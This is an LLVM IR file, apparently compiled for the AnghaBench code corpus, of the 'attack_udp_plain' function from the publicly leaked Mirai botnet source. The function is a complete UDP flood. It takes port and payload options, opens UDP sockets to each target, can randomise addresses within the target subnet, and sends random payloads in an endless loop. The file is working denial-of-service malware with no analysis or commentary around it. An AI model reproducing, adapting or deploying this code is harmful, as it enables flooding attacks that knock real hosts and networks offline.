; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_plain.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_plain.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, %struct.TYPE_6__, i32 }
%struct.TYPE_6__ = type { %struct.TYPE_5__, i8* }
%struct.TYPE_5__ = type { i32 }
%struct.attack_option = type { i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_4__, i32, i32 }
%struct.TYPE_4__ = type { i64 }
%struct.iphdr = type { i32 }
%struct.udphdr = type { i32 }
%struct.sockaddr = type { i32 }

@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@ATK_OPT_SPORT = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_SIZE = common dso_local global i32 0, align 4
@ATK_OPT_PAYLOAD_RAND = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_udp_plain(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca %struct.sockaddr_in, align 8
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %21 = load i32, i32* %5, align 4
  %22 = call i8* @calloc(i32 %21, i32 8)
  %23 = bitcast i8* %22 to i8**
  store i8** %23, i8*** %10, align 8
  %24 = load i32, i32* %5, align 4
  %25 = call i8* @calloc(i32 %24, i32 4)
  %26 = bitcast i8* %25 to i32*
  store i32* %26, i32** %11, align 8
  %27 = load i32, i32* %7, align 4
  %28 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %29 = load i32, i32* @ATK_OPT_DPORT, align 4
  %30 = call i8* @attack_get_opt_int(i32 %27, %struct.attack_option* %28, i32 %29, i32 65535)
  %31 = ptrtoint i8* %30 to i32
  store i32 %31, i32* %12, align 4
  %32 = load i32, i32* %7, align 4
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = load i32, i32* @ATK_OPT_SPORT, align 4
  %35 = call i8* @attack_get_opt_int(i32 %32, %struct.attack_option* %33, i32 %34, i32 65535)
  %36 = ptrtoint i8* %35 to i32
  store i32 %36, i32* %13, align 4
  %37 = load i32, i32* %7, align 4
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = load i32, i32* @ATK_OPT_PAYLOAD_SIZE, align 4
  %40 = call i8* @attack_get_opt_int(i32 %37, %struct.attack_option* %38, i32 %39, i32 512)
  store i8* %40, i8** %14, align 8
  %41 = load i32, i32* %7, align 4
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = load i32, i32* @ATK_OPT_PAYLOAD_RAND, align 4
  %44 = load i32, i32* @TRUE, align 4
  %45 = call i8* @attack_get_opt_int(i32 %41, %struct.attack_option* %42, i32 %43, i32 %44)
  store i8* %45, i8** %15, align 8
  %46 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %46, i8 0, i64 24, i1 false)
  %47 = load i32, i32* %13, align 4
  %48 = icmp eq i32 %47, 65535
  br i1 %48, label %49, label %52

49:                                               ; preds = %4
  %50 = call i8* (...) @rand_next()
  %51 = ptrtoint i8* %50 to i32
  store i32 %51, i32* %13, align 4
  br label %56

52:                                               ; preds = %4
  %53 = load i32, i32* %13, align 4
  %54 = call i8* @htons(i32 %53)
  %55 = ptrtoint i8* %54 to i32
  store i32 %55, i32* %13, align 4
  br label %56

56:                                               ; preds = %52, %49
  store i32 0, i32* %9, align 4
  br label %57

57:                                               ; preds = %164, %56
  %58 = load i32, i32* %9, align 4
  %59 = load i32, i32* %5, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %167

61:                                               ; preds = %57
  %62 = call i8* @calloc(i32 65535, i32 1)
  %63 = load i8**, i8*** %10, align 8
  %64 = load i32, i32* %9, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8*, i8** %63, i64 %65
  store i8* %62, i8** %66, align 8
  %67 = load i32, i32* %12, align 4
  %68 = icmp eq i32 %67, 65535
  br i1 %68, label %69, label %77

69:                                               ; preds = %61
  %70 = call i8* (...) @rand_next()
  %71 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %72 = load i32, i32* %9, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %71, i64 %73
  %75 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %74, i32 0, i32 1
  %76 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %75, i32 0, i32 1
  store i8* %70, i8** %76, align 8
  br label %86

77:                                               ; preds = %61
  %78 = load i32, i32* %12, align 4
  %79 = call i8* @htons(i32 %78)
  %80 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %81 = load i32, i32* %9, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %80, i64 %82
  %84 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i32 0, i32 1
  %85 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %84, i32 0, i32 1
  store i8* %79, i8** %85, align 8
  br label %86

86:                                               ; preds = %77, %69
  %87 = load i32, i32* @AF_INET, align 4
  %88 = load i32, i32* @SOCK_DGRAM, align 4
  %89 = load i32, i32* @IPPROTO_UDP, align 4
  %90 = call i32 @socket(i32 %87, i32 %88, i32 %89)
  %91 = load i32*, i32** %11, align 8
  %92 = load i32, i32* %9, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i32, i32* %91, i64 %93
  store i32 %90, i32* %94, align 4
  %95 = icmp eq i32 %90, -1
  br i1 %95, label %96, label %97

96:                                               ; preds = %86
  br label %202

97:                                               ; preds = %86
  %98 = load i32, i32* @AF_INET, align 4
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  store i32 %98, i32* %99, align 8
  %100 = load i32, i32* %13, align 4
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i32 %100, i32* %101, align 8
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  %103 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %102, i32 0, i32 0
  store i64 0, i64* %103, align 8
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %110 = call i32 @bind(i32 %108, %struct.sockaddr* %109, i32 24)
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %113

112:                                              ; preds = %97
  br label %113

113:                                              ; preds = %112, %97
  %114 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %115 = load i32, i32* %9, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %114, i64 %116
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i32 0, i32 0
  %119 = load i32, i32* %118, align 8
  %120 = icmp slt i32 %119, 32
  br i1 %120, label %121, label %148

121:                                              ; preds = %113
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i32, i32* %126, align 8
  %128 = call i64 @ntohl(i32 %127)
  %129 = call i8* (...) @rand_next()
  %130 = ptrtoint i8* %129 to i32
  %131 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %132 = load i32, i32* %9, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %131, i64 %133
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 8
  %137 = ashr i32 %130, %136
  %138 = sext i32 %137 to i64
  %139 = add nsw i64 %128, %138
  %140 = call i32 @htonl(i64 %139)
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %145, i32 0, i32 0
  %147 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %146, i32 0, i32 0
  store i32 %140, i32* %147, align 8
  br label %148

148:                                              ; preds = %121, %113
  %149 = load i32*, i32** %11, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i32, i32* %149, i64 %151
  %153 = load i32, i32* %152, align 4
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 1
  %159 = bitcast %struct.TYPE_6__* %158 to %struct.sockaddr*
  %160 = call i32 @connect(i32 %153, %struct.sockaddr* %159, i32 24)
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %163

162:                                              ; preds = %148
  br label %163

163:                                              ; preds = %162, %148
  br label %164

164:                                              ; preds = %163
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  br label %57

167:                                              ; preds = %57
  br label %168

168:                                              ; preds = %201, %167
  %169 = load i32, i32* @TRUE, align 4
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %202

171:                                              ; preds = %168
  store i32 0, i32* %9, align 4
  br label %172

172:                                              ; preds = %198, %171
  %173 = load i32, i32* %9, align 4
  %174 = load i32, i32* %5, align 4
  %175 = icmp slt i32 %173, %174
  br i1 %175, label %176, label %201

176:                                              ; preds = %172
  %177 = load i8**, i8*** %10, align 8
  %178 = load i32, i32* %9, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i8*, i8** %177, i64 %179
  %181 = load i8*, i8** %180, align 8
  store i8* %181, i8** %20, align 8
  %182 = load i8*, i8** %15, align 8
  %183 = icmp ne i8* %182, null
  br i1 %183, label %184, label %188

184:                                              ; preds = %176
  %185 = load i8*, i8** %20, align 8
  %186 = load i8*, i8** %14, align 8
  %187 = call i32 @rand_str(i8* %185, i8* %186)
  br label %188

188:                                              ; preds = %184, %176
  %189 = load i32*, i32** %11, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i32, i32* %189, i64 %191
  %193 = load i32, i32* %192, align 4
  %194 = load i8*, i8** %20, align 8
  %195 = load i8*, i8** %14, align 8
  %196 = load i32, i32* @MSG_NOSIGNAL, align 4
  %197 = call i32 @send(i32 %193, i8* %194, i8* %195, i32 %196)
  br label %198

198:                                              ; preds = %188
  %199 = load i32, i32* %9, align 4
  %200 = add nsw i32 %199, 1
  store i32 %200, i32* %9, align 4
  br label %172

201:                                              ; preds = %172
  br label %168

202:                                              ; preds = %96, %168
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i8* @rand_next(...) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @htonl(i64) #1

declare dso_local i64 @ntohl(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @rand_str(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
